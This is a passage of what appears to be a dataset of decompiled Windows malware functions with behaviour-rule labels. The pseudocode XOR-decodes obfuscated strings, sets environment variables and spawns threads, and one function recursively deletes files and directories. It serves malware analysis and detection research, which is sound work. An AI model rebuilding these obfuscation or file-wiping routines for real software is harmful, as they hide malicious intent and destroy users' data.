^ puVar1[&var_24h - iVar5];\n        } while (iVar9 < 0x12);\n        (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableW)(iVar5, &var_34ch);\n        uVar4 = (*pcVar2)(0, iVar5);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    }\n    iVar5 = fcn.00404bd0();\n    var_64h = 5;\n    if (iVar5 != 0) {\n        if (2 < var_58h._1_1_) {\n            iVar5 = 0;\n            if (0 < var_58h._1_1_ - 2) {\n                do {\n                    *0x41cd3c = *0x41cd3c + (&var_4ch)[iVar5];\n                    iVar5 = iVar5 + 1;\n                } while (iVar5 < var_58h._1_1_ - 2);\n            }\n        }\n        *0x41cd3c = *0x41cd3c ^ 0x43103655;\n        iVar5 = fcn.0040d36c();\n        if (iVar5 != 0) {\n            if (*0x41ccd8 < 6) {\n                var_a8h = 0xb630e10;\n                var_a4h = 0x87d1b6d;\n                var_a0h._0_1_ = 6;\n                stack0xffffff5d = 0x7075136d;\n                var_9bh = 0x73166d74;\n                var_97h = 0x6f126762;\n                var_93h = 0x1f0c027b;\n                var_8fh = 0x740a736f;\n                var_8bh._0_2_ = 0x6f6d;\n                var_8bh._2_1_ = 0x75;\n                var_8bh._3_1_ = 5;\n                var_87h = 0xf157e66;\n                var_83h._0_1_ = 4;\n                stack0xffffff7b = 0xc0f1d15;\n                var_7dh = 0xf6f6d0e;\n                var_79h = 0x7c7f1a0a;\n                var_75h = 0x1f007075;\n                var_71h = 0x8707d17;\n                var_6dh = 0x700f6f17;\n                var_69h = 0x347d170d;\n                var_8h = 0x4f4b3454;\n                var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x56);\n                var_83h._1_1_ = var_a0h;\n                uVar4 = (*pcVar2)(8, 0x44);\n                iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n                iVar9 = 0;\n                var_38h = &var_a8h - iVar5;\n                do {\n                    puVar1 = iVar9 + iVar5;\n                    iVar7 = iVar9 % var_64h;\n                    iVar9 = iVar9 + 1;\n                    *puVar1 = *(&var_8h + iVar7) ^ puVar1[&var_a8h - iVar5];\n                } while (iVar9 < 0x43);\n            }\n            else {\n                var_24h = 0x214a5702;\n                var_20h = 0x236a497c;\n                var_1ch = 0x490b5735;\n                var_18h = 0x6c4b3a1d;\n                var_8h = 0x6c626d51;\n                var_4h._0_2_ = 0x7230;\n                uVar4 = (*pcVar2)(8, 0x11);\n                iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n                iVar9 = 0;\n                var_38h = &var_24h - iVar5;\n                do {\n                    puVar1 = iVar9 + iVar5;\n                    iVar7 = iVar9 % var_34h;\n                    iVar9 = iVar9 + 1;\n                    *puVar1 = *(&var_8h + iVar7) ^ puVar1[&var_24h - iVar5];\n                } while (iVar9 < 0x10);\n            }\n            var_c0h = 0xc;\n            var_b8h = 0;\n            var_bch = 0;\n            (*_sym.imp.ADVAPI32.dll_ConvertStringSecurityDescriptorToSecurityDescriptorA)(iVar5, 1, &var_bch, 0);\n            uVar4 = (*pcVar2)(0, iVar5);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n    }\n    *0x41cd58 = fcn.0040c5b3();\n    *0x41cd58 = *0x41cd58 & 0xffff;\n    var_20h = 0x6c544d2c;\n    var_1ch = 0x50213915;\n    var_18h = 0x3f0a4655;\n    var_14h._0_2_ = 0x353b;\n    var_8h = 0x33313549;\n    var_4h._0_2_ = 0x5a66;\n    uVar4 = (*pcVar2)(8, 0xf);\n    var_38h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar5 = 0;\n    var_2ch = &var_20h - var_38h;\n    do {\n        puVar1 = iVar5 + var_38h;\n        iVar9 = iVar5 % var_34h;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_8h + iVar9) ^ puVar1[&var_20h - var_38h];\n    } while (iVar5 < 0xe);\n    var_20h = 0x572c3045;\n    var_1ch = 0x2b5a550e;\n    var_18h = 0x40075c23;\n    var_14h._0_2_ = 0x445b;\n    var_8h = 0x394d4436;\n    var_4h._0_2_ = 0x346a;\n    uVar4 = (*pcVar2)(8, 0xf);\n    var_b0h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar5 = 0;\n    var_2ch = &var_20h - var_b0h;\n    do {\n        puVar1 = iVar5 + var_b0h;\n        iVar9 = iVar5 % var_34h;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_8h + iVar9) ^ puVar1[&var_20h - var_b0h];\n    } while (iVar5 < 0xe);\n    var_60h = 0x12120b7d;\n    var_5ch._0_2_ = 0x5202;\n    var_10h = 0x374d7858;\n    var_ch._0_2_ = 0x5266;\n    uVar4 = (*pcVar2)(8, 7);\n    var_8h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar5 = 0;\n    var_2ch = &var_60h - var_8h;\n    do {\n        puVar1 = iVar5 + var_8h;\n        iVar9 = iVar5 % var_34h;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_10h + iVar9) ^ puVar1[&var_60h - var_8h];\n    } while (iVar5 < 6);\n    (*_sym.imp.USER32.dll_wsprintfA)(&var_104h, var_8h, var_38h, *0x41c760);\n    *0x41ccc8 = fcn.00407ff4();\n    *0x41cd58 = 6000;\n    var_3ch = CONCAT13(var_3ch._3_1_, 0x71105f);\n    var_10h = 0x7671747a;\n    var_ch._0_1_ = 0x38;\n    uVar4 = (*pcVar2)(8, 4);\n    var_60h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar5 = 0;\n    var_2ch = &var_3ch - var_60h;\n    do {\n        puVar1 = iVar5 + var_60h;\n        iVar9 = iVar5 % var_64h;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_10h + iVar9) ^ puVar1[&var_3ch - var_60h];\n    } while (iVar5 < 3);\n    (*_sym.imp.USER32.dll_wsprintfA)(&var_144h, var_60h, *0x41cd58);\n    var_10h = 0x271c4a33;\n    var_ch._0_1_ = 99;\n    var_2ch = 0x42693847;\n    var_28h._0_2_ = 0x3563;\n    uVar4 = (*pcVar2)(8, 6);\n    var_ach = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar5 = 0;\n    do {\n        puVar1 = iVar5 + var_ach;\n        iVar9 = iVar5 % var_34h;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_2ch + iVar9) ^ puVar1[&var_10h - var_ach];\n    } while (iVar5 < 5);\n    var_1ch = 0x3c1b3012;\n    var_18h = 0x1c0a160b;\n    var_14h._0_2_ = 0x643c;\n    var_10h = 0x58755564;\n    var_ch._0_2_ = CONCAT11(var_ch._1_1_, 100);\n    uVar4 = (*pcVar2)(8, 0xb);\n    var_3ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar9 = 0;\n    iVar5 = var_3ch;\n    do {\n        puVar1 = iVar9 + iVar5;\n        iVar5 = iVar9 % var_64h;\n        iVar9 = iVar9 + 1;\n        *puVar1 = *(&var_10h + iVar5) ^ puVar1[&var_1ch - var_3ch];\n        iVar5 = var_3ch;\n    } while (iVar9 < 10);\n    var_50h = 0x23d0827;\n    var_4ch._0_2_ = 0x449;\n    var_4ch._2_1_ = 0x25;\n    stack0xffffffb3 = 0x4a1f310a;\n    stack0xffffffb7 = 0x260c3c19;\n    var_44h._3_1_ = 0x1e;\n    var_40h = 0x692f1250;\n    var_18h = 0x6c54694a;\n    var_14h._0_2_ = 0x7639;\n    uVar4 = (*pcVar2)(8, 0x15);\n    var_2ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar5 = 0;\n    var_10h = &var_50h - var_2ch;\n    do {\n        puVar1 = iVar5 + var_2ch;\n        iVar9 = iVar5 % var_34h;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_18h + iVar9) ^ puVar1[&var_50h - var_2ch];\n    } while (iVar5 < 0x14);\n    var_54h = 0x7275831;\n    var_50h = 0x20750e5a;\n    var_4ch._0_2_ = 0x4110;\n    var_4ch._2_1_ = 6;\n    stack0xffffffb3 = 0x470c1957;\n    stack0xffffffb7 = 0x10287b17;\n    var_44h._3_1_ = 0x50;\n    var_40h = var_40h & 0xffffff00 | 99;\n    var_34h = 0x63493963;\n    var_30h._0_1_ = 0x35;\n    uVar4 = (*pcVar2)(8, 0x16);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar9 = 0;\n    var_10h = &var_54h - iVar5;\n    do {\n        puVar1 = iVar9 + iVar5;\n        iVar7 = iVar9 % var_64h;\n        iVar9 = iVar9 + 1;\n        *puVar1 = *(&var_34h + iVar7) ^ puVar1[&var_54h - iVar5];\n        pcVar2 = _sym.imp.KERNEL32.dll_SetEnvironmentVariableA;\n    } while (iVar9 < 0x15);\n    (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableA)(var_b0h, var_ach);\n    (*pcVar2)(var_3ch, &var_104h);\n    (*pcVar2)(var_2ch, 0x41c764);\n    (*pcVar2)(iVar5, &var_144h);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n    puVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    puVar10 = puVar6;\n    for (iVar9 = 0xc; iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    *puVar6 = 0x20;\n    *0x41ccbc = (*_sym.imp.KERNEL32.dll_CreateEventA)(0, 0, 0, 0);\n    pcVar2 = _sym.imp.KERNEL32.dll_CreateThread;\n    *0x41cd60 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00405051, puVar6, 0, 0);\n    *0x41cd64 = (*pcVar2)(0, 0, fcn.00407121, *0x41ccc0, 0, 0);\n    *0x41cd68 = (*pcVar2)(0, 0, fcn.00401d1b, puVar6, 0, 0);\n    *0x41cd6c = (*pcVar2)(0, 0, 0x40710a, puVar6, 0, 0);\n    uVar4 = (*pcVar2)(0, 0, fcn.0040b35e, arg_8h, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar4);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*pcVar3)(0, var_2ch);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_3ch);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_ach);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_60h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_8h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_b0h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_38h);\n    (*pcVar2)(uVar4);\n    return 0;\n}\n",
        "token_count": 5169
    },
    "0040d36c": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040d36c(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_ch = 0;\n    var_4h = *0x41cd3c;\n    fcn.00406585();\n    uVar3 = fcn.00406585();\n    iVar4 = fcn.0040d0a4(uVar3 & 0xff, 0x41cd3c, 0x41cd40, &var_8h);\n    if (iVar4 != 0) {\n        iVar4 = fcn.0040d0a4(0, 0x41cd3c, 0x41cd44, &var_8h);\n        if (iVar4 != 0) {\n            var_24h = 0x4629626f;\n            var_20h = 0x4c074101;\n            var_1ch._0_2_ = 0x7946;\n            var_18h = 0x464c6241;\n            var_14h._0_1_ = 0x79;\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n            iVar7 = 0;\n            do {\n                var_10h = 5;\n                puVar1 = iVar7 + iVar4;\n                iVar6 = iVar7 % 5;\n                iVar7 = iVar7 + 1;\n                *puVar1 = *(&var_18h + iVar6) ^ puVar1[&var_24h - iVar4];\n            } while (iVar7 < 10);\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(*0x41cd44, iVar4);\n            iVar7 = fcn.0040d0a4(0, 0x41cd3c, 0x41cd54, &var_8h);\n            pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (iVar7 != 0) {\n                var_4h = var_4h ^ 0x29787279;\n                var_4h = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                iVar7 = fcn.0040d0a4(0, &var_4h, 0x41cd48, &var_8h);\n                if (iVar7 != 0) {\n                    var_ch = 1;\n                }\n            }\n            uVar5 = (*pcVar2)(0, iVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 706
    },
    "0040d8a5": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040d8a5(int32_t arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    code *pcVar8;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    int32_t hFindFile;\n    uint var_2ch;\n    int32_t var_28h;\n    int16_t *var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    int32_t lpString2;\n    int32_t var_ch;\n    uint8_t *lpFindFileData;\n    int32_t lpFileName;\n    \n    var_ch = 8;\n    var_20h = 0x104;\n    var_34h = fcn.0040d833();\n    lpString2 = in_ECX;\n    if (var_34h != 0) {\n        lpString2 = var_34h;\n    }\n    var_1ch = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2);\n    pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n    lpFileName = iVar3;\n    if (iVar3 != 0) {\n        uVar2 = (*pcVar7)(8, var_1ch * 2 + 0xc);\n        var_14h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        if (var_14h != 0) {\n            uVar2 = (*pcVar7)(8, 0x250);\n            lpFindFileData = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            if (lpFindFileData != NULL) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(iVar3, lpString2);\n                var_ch = 0x336d3032;\n                hFindFile = 0x336d306e;\n                var_2ch._0_2_ = 0x7354;\n                uVar2 = (*pcVar7)(8, 9);\n                var_28h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                var_18h = 6;\n                iVar3 = 0;\n                do {\n                    puVar1 = iVar3 + var_28h;\n                    iVar4 = iVar3 % 6;\n                    iVar3 = iVar3 + 1;\n                    *puVar1 = *(&hFindFile + iVar4) ^ puVar1[&var_ch - var_28h];\n                } while (iVar3 < 4);\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, var_28h);\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(var_14h, lpString2);\n                var_40h = 0x3047736a;\n                var_3ch = 0x731c4b66;\n                var_38h._0_2_ = 0x306d;\n                hFindFile = 0x306d7336;\n                var_2ch._0_2_ = 0x4b48;\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n                iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                iVar3 = var_14h;\n                iVar6 = 0;\n                do {\n                    puVar1 = iVar6 + iVar4;\n                    iVar5 = iVar6 % var_18h;\n                    iVar6 = iVar6 + 1;\n                    *puVar1 = *(&hFindFile + iVar5) ^ puVar1[&var_40h - iVar4];\n                } while (iVar6 < 10);\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(var_14h, iVar4);\n                hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar3, lpFindFileData);\n                iVar3 = var_28h;\n                pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                if (hFindFile == -1) {\n                    var_ch = 3;\n                }\n                else {\n                    var_ch = 0;\n                    var_24h = lpFindFileData + 0x2c;\n                    do {\n                        if (*var_24h != 0x2e) {\n                            iVar6 = (*_sym.imp.KERNEL32.dll_lstrlenW)(var_24h);\n                            var_18h = iVar6 + 2 + var_1ch;\n                            if (var_20h < var_18h) {\n                                uVar2 = (*pcVar7)(0, lpFileName);\n                                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                                uVar2 = (*pcVar7)(8, var_18h * 2);\n                                lpFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                                if (lpFileName == 0) {\n                                    var_ch = 8;\n                                    break;\n                                }\n                                var_20h = var_18h;\n                                (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpFileName, lpString2);\n                                (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, iVar3);\n                            }\n                            else {\n                                *(lpFileName + 2 + var_1ch * 2) = 0;\n                            }\n                            (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, var_24h);\n                            if ((*lpFindFileData & 0x10) == 0) {\n                                iVar6 = (*_sym.imp.KERNEL32.dll_DeleteFileW)(lpFileName);\n                            }\n                            else {\n                                var_ch = fcn.0040d8a5(arg_8h);\n                                if (var_ch != 0) break;\n                                iVar6 = (*_sym.imp.KERNEL32.dll_RemoveDirectoryW)(lpFileName);\n                            }\n                            if ((iVar6 == 0) && (arg_8h == 0)) {\n                                var_ch = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                                break;\n                            }\n                        }\n                        iVar6 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, lpFindFileData);\n                    } while (iVar6 != 0);\n                }\n                uVar2 = (*pcVar7)(0, iVar4);\n                pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                uVar2 = (*pcVar7)(0, iVar3);\n                (*pcVar8)(uVar2);\n                uVar2 = (*pcVar7)(0, lpFindFileData);\n                (*pcVar8)(uVar2);\n                iVar3 = lpFileName;\n            }\n            uVar2 = (*pcVar7)(0, var_14h);\n            (*pcVar8)(uVar2);\n        }\n        if (iVar3 != 0) {\n            uVar2 = (*pcVar7)(0, iVar3);\n            (*pcVar8)(uVar2);\n        }\n    }\n    if (var_34h != 0) {\n        uVar2 = (*pcVar7)(0, var_34h);\n        (*pcVar8)(uVar2);\n    }\n    return var_ch;\n}\n",
        "token_count": 1746
    },
    "0040e844": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040e844(uchar *param_1)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uint var_50h;\n    uchar var_4ch;\n    uint var_4bh;\n    uint var_47h;\n    uint var_43h;\n    uint var_3fh;\n    uchar var_3bh;\n    uchar var_3ah;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uchar *var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_4h = 0;\n    var_2ch = param_1;\n    if ((((*0x41cda0 | *0x41cda4) == 0) || ((*0x41cda8 | *0x41cdac) == 0)) || ((*0x41cdb0 | *0x41cdb4) == 0)) {\n        var_4h = 0x7f;\n        var_28h._0_2_ = 0x2e38;\n        var_28h._2_1_ = 8;\n        var_8h = 5;\n        var_28h._3_1_ = 5;\n        var_24h = 0x36324a04;\n        var_20h._0_2_ = 0x6900;\n        var_34h = 0x696c5a56;\n        var_30h._0_2_ = 0x6468;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        var_1ch = 6;\n        var_10h = iVar4;\n        iVar8 = 0;\n        var_18h = &var_28h - iVar4;\n        do {\n            puVar1 = iVar8 + iVar4;\n            iVar5 = iVar8 % 6;\n            iVar8 = iVar8 + 1;\n            *puVar1 = *(&var_34h + iVar5) ^ puVar1[&var_28h - iVar4];\n        } while (iVar8 < 10);\n        var_ch = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4);\n        if (var_ch == 0) {\n            uVar3 = (*pcVar6)(0, iVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            return var_4h;\n        }\n        var_38h = 0x93f2a36;\n        var_34h = 0x92a1b5a;\n        var_30h._0_2_ = 0x5929;\n        var_30h._2_1_ = 0x7a;\n        var_24h = 0x454d4e7a;\n        var_20h._0_1_ = 0x35;\n        uVar3 = (*pcVar6)(8, 0xc);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar8 = 0;\n        var_18h = iVar4;\n        var_1ch = &var_38h - iVar4;\n        do {\n            puVar1 = iVar8 + iVar4;\n            iVar5 = iVar8 % var_8h;\n            iVar8 = iVar8 + 1;\n            *puVar1 = *(&var_24h + iVar5) ^ puVar1[&var_38h - iVar4];\n        } while (iVar8 < 0xb);\n        *0x41cda0 = fcn.00408a15();\n        iVar8 = var_10h;\n        *0x41cda4 = *0x41cda0 >> 0x1f;\n        if ((*0x41cda0 | *0x41cda4) == 0) {\n            uVar3 = (*pcVar6)(0, iVar4);\n            pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            uVar3 = (*pcVar6)(0, iVar8);\n            (*pcVar2)(uVar3);\n            return var_4h;\n        }\n        var_50h = 0x2c3f5c06;\n        _var_4ch = 0x3f683e1d;\n        var_4bh._3_1_ = 4;\n        var_47h = 0x385c2f1b;\n        var_43h = 0x5c0b1d19;\n        var_3fh = 0x391d1929;\n        var_3bh = 0x4b;\n        var_3ah = 0x4d;\n        var_24h = 0x6b4d384a;\n        var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x78);\n        uVar3 = (*pcVar6)(8, 0x18);\n        var_14h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar4 = 0;\n        do {\n            puVar1 = iVar4 + var_14h;\n            iVar8 = iVar4 % var_8h;\n            iVar4 = iVar4 + 1;\n            *puVar1 = *(&var_24h + iVar8) ^ puVar1[&var_50h - var_14h];\n        } while (iVar4 < 0x17);\n        *0x41cda8 = fcn.00408a15();\n        iVar8 = var_10h;\n        iVar4 = var_18h;\n        *0x41cdac = *0x41cda8 >> 0x1f;\n        if ((*0x41cda8 | *0x41cdac) == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_14h);\n            pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_50h = 0x33204419;\n            _var_4ch = 0x1356373f;\n            var_4bh._3_1_ = 0x35;\n            var_47h = 0x4412a06;\n            var_43h = 0x7e2f3134;\n            var_3fh = 0x313f2c15;\n            var_3bh = 0x4a;\n            var_3ah = 0x70;\n            var_34h = 0x41703343;\n            var_30h._0_2_ = CONCAT11(var_30h._1_1_, 0x50);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n            var_1ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar4 = 0;\n            do {\n                puVar1 = iVar4 + var_1ch;\n                iVar8 = iVar4 % var_8h;\n                iVar4 = iVar4 + 1;\n                *puVar1 = *(&var_34h + iVar8) ^ puVar1[&var_50h - var_1ch];\n            } while (iVar4 < 0x17);\n            *0x41cdb0 = fcn.00408a15();\n            iVar8 = var_10h;\n            iVar4 = var_18h;\n            *0x41cdb4 = *0x41cdb0 >> 0x1f;\n            if ((*0x41cdb0 | *0x41cdb4) != 0) {\n                var_4h = 0;\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_1ch);\n                pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_14h);\n                (*pcVar6)(uVar3);\n                pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                (*pcVar6)(uVar3);\n                uVar3 = (*pcVar2)(0, iVar8);\n                (*pcVar6)(uVar3);\n                goto code_r0x0040eb55;\n            }\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n            pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_14h);\n        }\n        (*pcVar6)(uVar3);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n        (*pcVar6)(uVar3);\n        uVar3 = (*pcVar2)(0, iVar8);\n        (*pcVar6)(uVar3);\n    }\n    else {\ncode_r0x0040eb55:\n        puVar7 = 0x41cda0;\n        for (iVar4 = 0x18; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *var_2ch = *puVar7;\n            puVar7 = puVar7 + 1;\n            var_2ch = var_2ch + 1;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 2329
    },
    "0040eb6b": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040eb6b(uchar *param_1, uint param_2)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    uchar *puVar8;\n    int32_t iVar9;\n    uint var_50h;\n    uchar var_4ch;\n    uint var_4bh;\n    uint var_47h;\n    uint var_43h;\n    uint var_3fh;\n    uchar var_3bh;\n    uchar var_3ah;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uchar *var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_4h = 0;\n    var_2ch = param_1;\n    if ((((*0x41cdb8 | *0x41cdbc) == 0) || ((*0x41cdc0 | *0x41cdc4) == 0)) || ((*0x41cdc8 | *0x41cdcc) == 0)) {\n        var_4h = 0x7f;\n        var_28h._0_2_ = 0x2e38;\n        var_28h._2_1_ = 8;\n        var_8h = 5;\n        var_28h._3_1_ = 5;\n        var_24h = 0x36324a04;\n        var_20h._0_2_ = 0x6900;\n        var_34h = 0x696c5a56;\n        var_30h._0_2_ = 0x6468;\n        var_10h = param_2;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        var_ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        var_1ch = 6;\n        iVar9 = 0;\n        var_18h = &var_28h - var_ch;\n        do {\n            puVar1 = iVar9 + var_ch;\n            iVar4 = iVar9 % 6;\n            iVar9 = iVar9 + 1;\n            *puVar1 = *(&var_34h + iVar4) ^ puVar1[&var_28h - var_ch];\n        } while (iVar9 < 10);\n        var_38h = 0x93f2a36;\n        var_34h = 0x92a1b5a;\n        var_30h._0_2_ = 0x5929;\n        var_30h._2_1_ = 0x7a;\n        var_24h = 0x454d4e7a;\n        var_20h._0_1_ = 0x35;\n        uVar3 = (*pcVar6)(8, 0xc);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar9 = var_ch;\n        iVar7 = 0;\n        var_18h = iVar4;\n        var_1ch = &var_38h - iVar4;\n        do {\n            puVar1 = iVar7 + iVar4;\n            iVar5 = iVar7 % var_8h;\n            iVar7 = iVar7 + 1;\n            *puVar1 = *(&var_24h + iVar5) ^ puVar1[&var_38h - iVar4];\n        } while (iVar7 < 0xb);\n        *0x41cdb8 = fcn.00408653(iVar4);\n        if (*0x41cdb8 == 0) {\n            uVar3 = (*pcVar6)(0, iVar4);\n            pcVar2 = 